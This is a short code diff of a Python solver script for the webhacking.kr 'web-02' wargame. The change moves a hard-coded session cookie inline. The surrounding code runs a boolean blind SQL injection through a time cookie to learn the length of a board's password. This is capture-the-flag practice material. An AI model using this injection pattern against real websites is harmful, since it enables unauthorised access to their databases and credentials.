@@ -6,7 +6,6 @@ import CookieManager
 
 
 challengeUrl = "http://webhacking.kr/challenge/web/web-02/"
-sessionId = "d106ebfb4bba898681f92c7f5316fa6b"
 falseCondition = "<!--2070-01-01 09:00:00-->"
 trueCondition  = "<!--2070-01-01 09:00:01-->"
 
@@ -14,7 +13,7 @@ print "[*] Find password length from Freeboard"
 passwordLength = 0
 isFoundPassword = False
 
-CookieManager.addCookie("PHPSESSID", sessionId)
+CookieManager.addCookie("PHPSESSID", "d106ebfb4bba898681f92c7f5316fa6b")
 
 for passwordLength in range(1, 20):
     timeCookie = "1 and (SELECT length(password) FROM FreeB0aRd)=%d" % passwordLength
